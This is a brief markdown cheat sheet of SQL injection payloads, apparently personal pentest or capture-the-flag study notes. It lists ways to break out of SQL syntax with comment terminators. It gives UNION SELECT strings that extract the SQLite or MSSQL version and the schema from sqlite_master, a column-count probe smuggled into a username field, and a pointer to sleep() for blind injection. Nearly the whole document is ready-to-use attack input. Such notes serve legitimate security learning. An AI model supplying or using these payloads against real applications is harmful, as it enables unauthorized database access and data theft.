[Advance SQLi Cheatsheet](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/)

# Tips
- Text case
# Separating SQL Syntax
Can try with:
- `' <COMMAND> -- -`
- `' <COMMAND> #`
- `' <COMMAND> '`
# Union Attacks
## Get Version
- SQLite
```
' UNION SELECT sqlite_version()'
```
- MSSQL
```
' UNION SELECT @@version'
```
## Table Metadata
### Table Structure
- SQLite
```
' UNION SELECT group_concat(sql) FROM sqlite_master '
```
### Cardinality
```
username=admin' UNION SELECT 1,2,3;--
```
# Blind Injection
use `sleep()`